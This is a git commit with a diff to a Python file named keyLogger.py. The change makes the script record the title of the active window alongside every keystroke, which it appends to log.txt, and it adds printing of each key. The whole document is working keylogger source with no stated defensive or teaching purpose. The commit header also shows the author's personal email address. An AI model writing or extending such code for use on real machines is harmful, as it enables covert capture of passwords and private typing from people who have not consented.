895ac6da575d477f4b75ecb945c70caf38d02bb8
Darlan <darlaneduardoguimaraes@gmail.com>
2023-04-04 17:19:37 -0300

    event window

--- keyLogger.py
+++ keyLogger.py
@@ -1,10 +1,15 @@
 from pynput.keyboard import Key, Listener
+import win32gui
 
 def on_press(key):
+    hwnd = win32gui.GetForegroundWindow()
+    win_title = win32gui.GetWindowText(hwnd)
+
+
     key = str(key)
     with open("log.txt", "a") as f:
-        f.write(key + "\n")
+        print(key)
+        f.write(key + ' ' + win_title + "\n")
 
 with Listener(on_press=on_press) as listener:
     listener.join()
-
